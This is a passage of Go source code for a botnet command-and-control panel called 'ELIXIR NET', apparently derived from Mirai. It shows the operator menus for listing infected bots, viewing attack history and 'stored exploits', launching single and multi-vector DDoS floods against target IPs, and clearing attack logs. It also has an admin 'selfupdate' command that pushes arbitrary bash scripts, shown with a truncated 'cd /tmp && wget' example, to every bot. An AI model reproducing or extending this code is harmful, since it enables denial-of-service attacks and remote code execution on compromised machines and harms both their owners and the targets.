						"\x1b[1;95m║ \x1b[38;5;51m%-19s\x1b[0m │ \x1b[38;5;201m%-12s\x1b[0m │ \x1b[1;36m%-13s\x1b[0m │ \x1b[1;33mv%d\x1b[0m          \x1b[1;95m║\r\n",
						ip, arch, uptimeStr, bot.version)))
				}
			}
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte(fmt.Sprintf(
				"\x1b[1;95m║ \x1b[1;97m☾ Total Bots: \x1b[38;5;201m%-6d\x1b[0m                                      \x1b[1;95m║\r\n",
				len(bots))))
			this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
			continue
		}
		if cmd == "botinfo" {
			this.conn.Write([]byte("\033[2J\033[1H\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m        ELIXIR NET - BOT INFORMATION         \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════╣\r\n"))
			botCount := clientList.Count()
			distribution := clientList.Distribution()
			bots := clientList.GetBots()
			this.conn.Write([]byte(fmt.Sprintf(
				"\x1b[1;95m║ \x1b[38;5;51m☾ Total Bots: \x1b[1;36m%-6d\x1b[0m                              \x1b[1;95m║\r\n",
				botCount)))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[38;5;201mArchitecture Distribution:\x1b[0m                    \x1b[1;95m║\r\n"))
			if botCount == 0 {
				this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;31m  ☾ No bots connected\x1b[0m                      \x1b[1;95m║\r\n"))
			} else {
				for arch, count := range distribution {
					archName := arch
					if archName == "" {
						archName = "unknown"
					}
					if len(archName) > 10 {
						archName = archName[:10]
					}
					percentage := float64(count) / float64(botCount) * 100
					barLen := int(percentage / 2.5)
					if barLen > 15 {
						barLen = 15
					}
					bar := strings.Repeat("█", barLen) + strings.Repeat("░", 15-barLen)
					this.conn.Write([]byte(fmt.Sprintf(
						"\x1b[1;95m║   \x1b[38;5;51m%-10s \x1b[1;36m%4d \x1b[38;5;201m%s \x1b[1;33m%5.1f%% \x1b[1;95m║\r\n",
						archName, count, bar, percentage)))
				}
			}
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════╣\r\n"))
			if len(bots) > 0 {
				totalUptime := time.Duration(0)
				for _, bot := range bots {
					totalUptime += bot.GetUptime()
				}
				avgUptime := totalUptime / time.Duration(len(bots))
				avgStr := fmt.Sprintf("%dh %dm", int(avgUptime.Hours()), int(avgUptime.Minutes())%60)
				this.conn.Write([]byte(fmt.Sprintf(
					"\x1b[1;95m║ \x1b[38;5;51m☾ Average Uptime: \x1b[1;36m%-10s\x1b[0m              \x1b[1;95m║\r\n",
					avgStr)))
			}
			this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════╝\r\n"))
			continue
		}
		if cmd == "history" {
			this.conn.Write([]byte("\033[2J\033[1H\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m                 ELIXIR NET - ATTACK HISTORY                \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[38;5;51mTime\x1b[0m                │ \x1b[38;5;201mDuration\x1b[0m │ \x1b[1;36mBots\x1b[0m │ \x1b[1;33mCommand\x1b[0m                    \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			history := database.GetUserHistory(username, 20)
			if len(history) == 0 {
				this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;31m☾ No attack history found\x1b[0m                              \x1b[1;95m║\r\n"))
			} else {
				for i, entry := range history {
					if i >= 20 {
						break
					}
					timeSent := time.Unix(int64(entry["time_sent"].(int)), 0)
					timeStr := timeSent.Format("2006-01-02 15:04:05")
					duration := entry["duration"].(int)
					maxBots := entry["max_bots"].(int)
					command := entry["command"].(string)
					if len(command) > 25 {
						command = command[:25] + "..."
					}
					color := "\x1b[38;5;51m"
					if i%2 == 1 {
						color = "\x1b[38;5;111m"
					}
					this.conn.Write([]byte(fmt.Sprintf(
						"\x1b[1;95m║ %s%-19s\x1b[0m │ \x1b[38;5;201m%-8d\x1b[0m │ \x1b[1;36m%-4d\x1b[0m │ \x1b[1;33m%-25s\x1b[0m \x1b[1;95m║\r\n",
						color, timeStr, duration, maxBots, command)))
				}
			}
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte(fmt.Sprintf(
				"\x1b[1;95m║ \x1b[1;97m☾ Showing last \x1b[38;5;201m%-3d\x1b[0m attacks                              \x1b[1;95m║\r\n",
				len(history))))
			this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
			continue
		}
		if cmd == "stop" {
			this.conn.Write([]byte("Stopping all attacks...\r\n"))
			payload := []byte{0x03}
			frame := make([]byte, 2+len(payload))
			binary.BigEndian.PutUint16(frame[0:2], uint16(len(payload)))
			copy(frame[2:], payload)
			clientList.QueueBuf(frame, -1, "")
			this.conn.Write([]byte("All attacks stopped\r\n"))
			continue
		}
		if cmd == "stats" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              ELIXIR NET - NETWORK STATISTICS              \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			botCount := clientList.Count()
			distribution := clientList.Distribution()
			activeAttacks := database.fetchRunningAttacks()
			totalAttacks := database.fetchAttacks()
			intelStats := GetIntelligenceStats()
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mBot Statistics:\x1b[0m                                         \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			for arch, count := range distribution {
				archName := arch
				if len(archName) > 15 {
					archName = archName[:15]
				}
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[38;5;51m%-15s\x1b[0m: \x1b[1;36m%-6d\x1b[0m bots                              \x1b[1;95m║\r\n", archName, count)))
			}
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;97mTotal Bots: \x1b[38;5;201m%-6d\x1b[0m                                    \x1b[1;95m║\r\n", botCount)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;97mActive Attacks: \x1b[38;5;201m%-6d\x1b[0m                              \x1b[1;95m║\r\n", activeAttacks)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;97mTotal Attacks: \x1b[38;5;201m%-6d\x1b[0m                               \x1b[1;95m║\r\n", totalAttacks)))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mIntelligence Statistics:\x1b[0m                                 \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[38;5;51mIntelligence Reports: \x1b[1;36m%-6d\x1b[0m                        \x1b[1;95m║\r\n", intelStats["total_reports"])))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[38;5;51mStored Exploits: \x1b[1;36m%-6d\x1b[0m                            \x1b[1;95m║\r\n", intelStats["total_exploits"])))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[38;5;51mP2P Peers: \x1b[1;36m%-6d\x1b[0m                                  \x1b[1;95m║\r\n", intelStats["p2p_peers"])))
			if protocolStats, ok := intelStats["by_protocol"].(map[uint8]int); ok && len(protocolStats) > 0 {
				this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
				this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mBy Protocol:\x1b[0m                                         \x1b[1;95m║\r\n"))
				this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
				protocolNames := map[uint8]string{
					1: "HTTP",
					2: "TCP",
					3: "UDP",
					4: "TELNET",
					5: "SSH",
				}
				for proto, count := range protocolStats {
					protoName := protocolNames[proto]
					if protoName == "" {
						protoName = fmt.Sprintf("PROTO_%d", proto)
					}
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[38;5;201m%-8s\x1b[0m: \x1b[1;36m%-6d\x1b[0m reports                          \x1b[1;95m║\r\n", protoName, count)))
				}
			}
			if vulnStats, ok := intelStats["by_vulnerability"].(map[uint8]int); ok && len(vulnStats) > 0 {
				this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
				this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mBy Vulnerability Type:\x1b[0m                               \x1b[1;95m║\r\n"))
				this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
				vulnNames := map[uint8]string{
					1: "OVERFLOW",
					2: "FMT_STR",
					3: "SQL_INJ",
					4: "CMD_INJ",
					5: "PATH_TRAV",
					7: "BUF_OVER",
					8: "INT_OVER",
				}
				for vuln, count := range vulnStats {
					vulnName := vulnNames[vuln]
					if vulnName == "" {
						vulnName = fmt.Sprintf("VULN_%d", vuln)
					}
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36m%-10s\x1b[0m: \x1b[38;5;201m%-6d\x1b[0m reports                        \x1b[1;95m║\r\n", vulnName, count)))
				}
			}
			this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
			this.conn.Write([]byte("\r\n\x1b[1;33mPress Enter to continue...\x1b[0m\r\n"))
			buf := make([]byte, 1)
			this.conn.Read(buf)
			continue
		}
		if userInfo.admin == 1 && cmd == "adminhelp" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;208m┌──────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mSpoofed Network - Admin Commands    \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m├──────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminuser     Add new normal user     \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminadmin    Add new admin           \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminremove   Remove user             \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminlogs     Clear attack logs       \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mselfupdate    Execute bash script     \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mcount         Show bot count          \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mbots          List connected bots     \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mstop          Stop all attacks        \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mstats         Network statistics       \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m└──────────────────────────────────────────────┘\r\n"))
			continue
		}
		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			usernameFormat := "username:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|"
			log.SetOutput(output)
			log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
		}
		botCount = userInfo.maxBots
		if userInfo.admin == 1 && cmd == "adminadmin" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Bots.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Max attack duration. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm(y): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("Failed to create Admin! \r\n"))
			} else {
				this.conn.Write([]byte("Admin created! \r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "adminlogs" {
			this.conn.Write([]byte("\033[1;91mClear attack logs\033[1;33m?(y/n): \033[0m"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CleanLogs() {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
			} else {
				this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
				fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "adminremove" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "adminuser" {
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter New Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose New Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Bot Count (-1 For Full Bots): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Max Attack Duration (-1 For None): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37m%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 For None): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m User Added Successfully.\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && strings.HasPrefix(cmd, "selfupdate ") {
			parts := strings.SplitN(cmd, " ", 2)
			if len(parts) < 2 {
				this.conn.Write([]byte("\x1b[1;31mUsage: selfupdate <bash_script>\r\n"))
				this.conn.Write([]byte("\x1b[1;33mExample: selfupdate cd /tmp && wget http:
				continue
			}
			script := parts[1]
			if len(script) > 4096 {
				this.conn.Write([]byte("\x1b[1;31mScript too long (max 4096 bytes)\r\n"))
				continue
			}
			buf := make([]byte, 0, len(script)+10)
			buf = append(buf, 0x00, 0x00)
			buf = append(buf, 0x01)
			scriptLen := uint16(len(script))
			buf = append(buf, byte(scriptLen>>8), byte(scriptLen&0xFF))
			buf = append(buf, []byte(script)...)
			totalLen := uint16(len(buf) - 2)
			buf[0] = byte(totalLen >> 8)
			buf[1] = byte(totalLen & 0xFF)
			clientList.QueueBuf(buf, -1, "")
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mSelfupdate command sent to all bots (%d bytes)\r\n", len(script))))
			continue
		}
		if cmd == "autobypass" {
			this.handleAutobypassMenu(username, userInfo, botCount, botCatagory)
			continue
		}
		if strings.HasPrefix(cmd, "multivector ") || strings.HasPrefix(cmd, "mv ") {
			prefix := "multivector "
			if strings.HasPrefix(cmd, "mv ") {
				prefix = "mv "
			}
			cmdParts := strings.TrimPrefix(cmd, prefix)
			parts := strings.Fields(cmdParts)
			if len(parts) < 3 {
				this.conn.Write([]byte("\x1b[1;31mUsage: multivector <method1> <method2> [method3...] <target> <duration> [flags]\r\n"))
				this.conn.Write([]byte("\x1b[1;33mExample: multivector tcp_full udp 1.2.3.4 120 port=80\r\n"))
				continue
			}
			methods := []string{}
			targetIdx := -1
			for i, part := range parts {
				if strings.Contains(part, ".") || (len(part) > 0 && part[0] >= '0' && part[0] <= '9') {
					targetIdx = i
					break
				}
				methods = append(methods, part)
			}
			if targetIdx == -1 || len(methods) == 0 {
				this.conn.Write([]byte("\x1b[1;31mInvalid command format. Need at least 2 methods and target+duration\r\n"))
				continue
			}
			restParts := parts[targetIdx:]
			successCount := 0
			for _, method := range methods {
				if _, exists := attackInfoLookup[method]; !exists {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33mWarning: Method '%s' not found, skipping\r\n", method)))
					continue
				}
				methodCmd := method + " " + strings.Join(restParts, " ")
				atk, err := NewAttack(methodCmd, userInfo.admin)
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33mWarning: Failed to parse '%s': %s\r\n", methodCmd, err.Error())))
					continue
				}
				buf, err := atk.Build()
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33mWarning: Failed to build '%s': %s\r\n", methodCmd, err.Error())))
					continue
				}
				if can, err := database.CanLaunchAttack(username, atk.Duration, methodCmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33mWarning: Cannot launch '%s': %s\r\n", methodCmd, err.Error())))
					continue
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					successCount++
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33mWarning: Blocked '%s' - whitelisted target\r\n", methodCmd)))
				}
			}
			if successCount > 0 {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mMulti-vector attack launched: %d methods sent to bots\r\n", successCount)))
			} else {
				this.conn.Write([]byte("\x1b[1;31mFailed to launch any methods\r\n"))
			}
			continue
		}
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mAttack sent to all bots\r\n")))
				} else {
					fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
				}
			}
		}
	}
}
func (this *Admin) addToHistory(cmd string) {
	if cmd == "" {
		return
	}
	if len(this.cmdHistory) > 0 && this.cmdHistory[len(this.cmdHistory)-1] == cmd {
		return
	}
	this.cmdHistory = append(this.cmdHistory, cmd)
	if len(this.cmdHistory) > 100 {
		this.cmdHistory = this.cmdHistory[1:]
	}
	this.historyPos = len(this.cmdHistory)
}
func (this *Admin) autoComplete(input string) string {
	if input == "" {
		return ""
	}
	matches := []string{}
	for _, cmd := range this.suggestions {
		if strings.HasPrefix(cmd, input) {
			matches = append(matches, cmd)
		}
	}
	if len(matches) == 1 {
		return matches[0]
	} else if len(matches) > 1 {
		this.conn.Write([]byte("\r\n"))
		for i, match := range matches {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36m%s\x1b[0m  ", match)))
			if (i+1)%5 == 0 {
				this.conn.Write([]byte("\r\n"))
			}
		}
		this.conn.Write([]byte("\r\n"))
	}
	return ""
}
func (this *Admin) clearLine(bufLen int) {
	for i := 0; i < bufLen; i++ {
		this.conn.Write([]byte("\b"))
	}
	for i := 0; i < bufLen; i++ {
		this.conn.Write([]byte(" "))
	}
	for i := 0; i < bufLen; i++ {
		this.conn.Write([]byte("\b"))
	}
}
func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufLen := 0
	cursorPos := 0
	for {
		readBuf := make([]byte, 1)
		n, err := this.conn.Read(readBuf)
		if err != nil || n != 1 {
			return "", err
		}
		b := readBuf[0]
		if b == '\xFF' {
			n, err := this.conn.Read(readBuf)
			if err != nil || n != 1 {
				return "", err
			}
			n, err = this.conn.Read(readBuf)
			if err != nil || n != 1 {
				return "", err
			}
			continue
		}
		if b == '\x1B' {
			escBuf := make([]byte, 2)
			n, _ := this.conn.Read(escBuf)
			if n == 2 && escBuf[0] == '[' {
				switch escBuf[1] {
				case 'A': 
					if len(this.cmdHistory) > 0 && this.historyPos > 0 {
						this.historyPos--
						this.clearLine(bufLen)
						bufLen = 0
						cursorPos = 0
						histCmd := this.cmdHistory[this.historyPos]
						copy(buf, []byte(histCmd))
						bufLen = len(histCmd)
						cursorPos = bufLen
						if !masked {
							this.conn.Write([]byte(histCmd))
						}
					}
					continue
				case 'B': 
					if this.historyPos < len(this.cmdHistory) {
						this.historyPos++
						this.clearLine(bufLen)
						bufLen = 0
						cursorPos = 0
						if this.historyPos < len(this.cmdHistory) {
							histCmd := this.cmdHistory[this.historyPos]
							copy(buf, []byte(histCmd))
							bufLen = len(histCmd)
							cursorPos = bufLen
							if !masked {
								this.conn.Write([]byte(histCmd))
				}
			}
					}
					continue
				case 'C': 
					if cursorPos < bufLen {
						cursorPos++
						this.conn.Write([]byte("\x1b[C"))
					}
					continue
				case 'D': 
					if cursorPos > 0 {
						cursorPos--
						this.conn.Write([]byte("\x1b[D"))
					}
					continue
				case '3': 
					delBuf := make([]byte, 1)
					this.conn.Read(delBuf)
					if delBuf[0] == '~' && cursorPos < bufLen {
						copy(buf[cursorPos:], buf[cursorPos+1:])
						bufLen--
						if !masked {
							this.conn.Write([]byte(string(buf[cursorPos:bufLen])))
							this.conn.Write([]byte(" \b"))
							for i := cursorPos; i < bufLen; i++ {
								this.conn.Write([]byte("\b"))
			}
						}
					}
					continue
				case 'H': 
					for cursorPos > 0 {
						this.conn.Write([]byte("\b"))
						cursorPos--
					}
					continue
				case 'F': 
					for cursorPos < bufLen {
						this.conn.Write([]byte("\x1b[C"))
						cursorPos++
					}
					continue
				}
			}
			continue
		}
		if b == '\x0C' {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			continue
		}
		if b == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		}
		if b == '\x15' {
			this.clearLine(bufLen)
			bufLen = 0
			cursorPos = 0
			continue
		}
		if b == '\x17' {
			if cursorPos > 0 {
				wordStart := cursorPos - 1
			for wordStart > 0 && buf[wordStart-1] != ' ' {
				wordStart--
			}
				deleted := cursorPos - wordStart
				copy(buf[wordStart:], buf[cursorPos:])
				bufLen -= deleted
				for i := 0; i < deleted; i++ {
					this.conn.Write([]byte("\b"))
			}
				if !masked {
					this.conn.Write([]byte(string(buf[wordStart:bufLen])))
					this.conn.Write([]byte(" "))
					for i := wordStart; i <= bufLen; i++ {
						this.conn.Write([]byte("\b"))
			}
				}
				cursorPos = wordStart
			}
			continue
		}
		if b == '\t' {
			if !masked && bufLen > 0 {
				input := string(buf[:bufLen])
				completed := this.autoComplete(input)
				if completed != "" {
					this.clearLine(bufLen)
					copy(buf, []byte(completed))
					bufLen = len(completed)
					cursorPos = bufLen
					this.conn.Write([]byte(completed))
			}
			}
			continue
		}
		if b == '\x7F' || b == '\x08' {
			if cursorPos > 0 {
				copy(buf[cursorPos-1:], buf[cursorPos:])
				bufLen--
				cursorPos--
				this.conn.Write([]byte("\b"))
				if !masked {
					this.conn.Write([]byte(string(buf[cursorPos:bufLen])))
					this.conn.Write([]byte(" \b"))
					for i := cursorPos; i < bufLen; i++ {
						this.conn.Write([]byte("\b"))
					}
				} else {
					this.conn.Write([]byte(" \b"))
				}
			}
			continue
		}
		if b == '\r' || b == '\n' {
			this.conn.Write([]byte("\r\n"))
			result := string(buf[:bufLen])
			if result != "" && !masked {
				this.addToHistory(result)
			}
			return result, nil
		}
		if b == '\x00' {
			continue
		}
		if b >= 32 && b <= 126 && bufLen < len(buf)-1 {
			if cursorPos < bufLen {
				copy(buf[cursorPos+1:], buf[cursorPos:])
			}
			buf[cursorPos] = b
			bufLen++
			cursorPos++
			if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[cursorPos-1 : bufLen])))
				for i := cursorPos; i < bufLen; i++ {
					this.conn.Write([]byte("\b"))
				}
			}
		}
	}
}
